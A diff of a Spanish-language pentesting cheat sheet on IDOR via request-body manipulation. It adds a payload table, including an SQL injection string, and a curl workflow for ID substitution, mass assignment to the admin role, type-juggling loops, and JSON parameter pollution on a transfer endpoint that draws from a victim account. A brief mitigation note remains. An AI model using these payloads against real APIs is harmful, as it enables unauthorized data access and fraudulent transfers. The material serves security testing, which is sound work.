@@ -1,17 +1,17 @@
 ---
-aliases:
+aliases: null
 tags:
   - type/technique
   - vuln/idor
   - technique/discovery
   - asset/api
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 kind: SubCheatSheet
 linked:
-  - "[[BOLA - IDOR]]"
+  - '[[BOLA - IDOR]]'
 ---
 # IDOR - Manipulación del Cuerpo de la Petición
 
@@ -19,29 +19,52 @@ linked:
 
 ## Cheatsheet
 
-| **Técnica**                                 | **Descripción**                                                                                                                                                                                            | **Body Original (Ejemplo)**                                 | **Body Modificado (Ejemplo)**                                 |
-| ------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- | ------------------------------------------------------------- |
-| <br>**Sustitución Directa de ID**           | <br>Reemplazo del identificador del objeto directamente en el payload JSON/XML para acceder o modificar datos de otro usuario.<br><br>                                                                     | <br>`{"doc_id": 105, "title": "Nota"}`                      | <br>`{"doc_id": 106, "title": "Nota"}`                        |
-| <br>**Inyección de Parámetros Ocultos**     | <br>Adición de campos identificadores que no estaban presentes en la petición original pero que el backend procesa (relacionado con [[Mass Assignment]]).<br><br>                                          | <br>`{"name": "Alice", "email": "a@a.com"}`<br><br>         | <br>`{"name": "Alice", "email": "a@a.com", "user_id": 106}`   |
-| <br>**Type Confusion (Type Juggling)**      | <br>Alteración del tipo de dato esperado (ej. cambiar un entero por un string, un booleano o un array) para eludir validaciones estrictas en el backend.<br><br>                                           | <br>`{"account_id": 105}`                                   | <br>`{"account_id": "106"}` o `{"account_id": [106]}`<br><br> |
-| <br>**Array Payload Injection**             | <br>Envío de una matriz de identificadores en lugar de un valor único. Útil cuando la lógica de validación solo comprueba el primer elemento pero la consulta afecta a todos.<br><br>                      | <br><br>`{"id": 105}`                                       | <br><br>`{"id": [105, 106]}`                                  |
-| <br>**Manipulación de Nodos XML**           | <br>Modificación de atributos o valores de nodos que representan identificadores dentro de un payload XML, a menudo evadiendo filtros diseñados solo para JSON o Query Strings.<br><br>                    | <br><br>`<user><id>105</id></user>`                         | <br><br>`<user><id>106</id></user>`                           |
-| <br>**Modificación en Multipart/Form-Data** | <br>Alteración de campos ocultos (hidden fields) o identificadores enviados dentro de los _boundaries_ de un formulario multipart, típicamente en subidas de archivos o actualizaciones de perfil.<br><br> | <br>`Content-Disposition: form-data; name="user_id"\n\n105` | <br>`Content-Disposition: form-data; name="user_id"\n\n106`   |
-| <br>**JSON Parameter Pollution**            | <br>Inyección del mismo parámetro varias veces dentro del mismo objeto JSON. Dependiendo del _parser_ del backend, se retendrá el primer o el último valor procesado.                                      | <br>`{"id": 105}`                                           | <br>`{"id": 105, "id": 106}`                                  |
+| **Body modificado** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `{"doc_id": 106, "title": "Nota"}` | Edición/lectura de doc ajeno | Sustitución directa de ID en JSON. |
+| `{"name": "Alice", "user_id": 106}` | Inyección de campo extra que backend acepta sin validar | Mass Assignment chained con IDOR. |
+| `{"account_id": "106"}` o `{"account_id": [106]}` | Type confusion — string/array bypasea validación strict-int | Backend con type juggling laxo. |
+| `{"id": [105, 106]}` | Array payload — validación checkea solo `[0]`, ORM aplica a todos | API con `WHERE id IN (...)` directo. |
+| `{"id": 105, "id": 106}` | JSON parameter pollution — parser retiene primero/último según lib | Express + bodyParser ≠ Java Jackson en parsing. |
+| `<user><id>106</id></user>` | XML cuando filtro solo cubre JSON | Endpoints multi-content-type. |
+| `Content-Disposition: form-data; name="user_id"\r\n\r\n106` | Override de ID via multipart hidden field | Formularios profile/upload. |
+| `{"id":105,"target_id":106}` | Endpoint admite "actor + target" sin verificar relación | Acciones admin disfrazadas como user. |
+| `{"id": "1' OR '1'='1"}` | IDOR + SQLi combo | Backend pasa ID a query sin parametrización. |
 ^idor-cuerpo
 
-## Estrategias de Evaluación y Testing
+### Workflow
 
-Al auditar o diseñar pruebas de [[API Security]], la evaluación del cuerpo de la petición requiere un enfoque estructurado para descubrir asunciones implícitas en el código:
-- Interceptar cada petición de mutación de estado (POST/PUT/PATCH/DELETE) y aislar todos los parámetros numéricos, UUIDs y campos que referencien recursos.
-- Intentar inyectar campos comunes como `id`, `user_id`, `account_id`, `role_id` o `org_id` en peticiones donde inicialmente no son requeridos.
-- Observar detenidamente las diferencias en las respuestas HTTP (códigos de estado, longitud del cuerpo, tiempos de respuesta) al enviar identificadores de objetos pertenecientes a otro contexto de autorización.
+```bash
+# 1. Capturar PUT/PATCH/POST original
+ORIG='{"doc_id": 105, "title": "Mi nota"}'
 
-### Principios de Mitigación
+# 2. Probar sustitución directa
+curl -X PUT https://target/api/doc \
+  -H 'Cookie: session=USER_A' \
+  -H 'Content-Type: application/json' \
+  -d '{"doc_id": 106, "title": "Mi nota"}'
 
-Para prevenir la manipulación del cuerpo de la petición, el sistema no debe depender nunca de los identificadores proporcionados por el cliente para tomar decisiones de autorización. El patrón arquitectónico correcto implica:
-- Extraer la identidad del usuario y su contexto de un token seguro y validado criptográficamente del lado del servidor (como un [[JWT Attacks]] correctamente implementado).
-- Utilizar Data Transfer Objects (DTO) estrictos que ignoren cualquier parámetro adicional no esperado en el payload (evitando el _Binding_ automático o _Mass Assignment_).
-- Validar siempre que el usuario autenticado posee los derechos explícitos sobre el identificador del objeto que se está intentando modificar o consultar.
+# 3. Mass Assignment + IDOR — injectar campos no esperados
+curl -X POST https://target/api/profile \
+  -H 'Cookie: session=USER_A' \
+  -H 'Content-Type: application/json' \
+  -d '{"name":"Alice","email":"a@a.com","user_id":1,"role":"admin"}'
+
+# 4. Type juggling con array
+for payload in '"106"' '[106]' '{"id":106}' '1.06e2' '0x6a'; do
+  curl -s -X POST https://target/api/get \
+    -H 'Content-Type: application/json' \
+    -d "{\"account_id\": $payload}" | head -c 200
+done
+
+# 5. JSON pollution — primer/último wins
+curl -X POST https://target/api/transfer \
+  -H 'Content-Type: application/json' \
+  --data-raw '{"from":"acc_A","to":"acc_A","from":"acc_VICTIM"}'
+```
+
+### Mitigación
+
+Extraer identidad del JWT verificado server-side, **no** del body. DTO estricto que ignora campos no declarados (`@JsonIgnoreProperties(ignoreUnknown=true)` + lista blanca explícita).
 
 ***
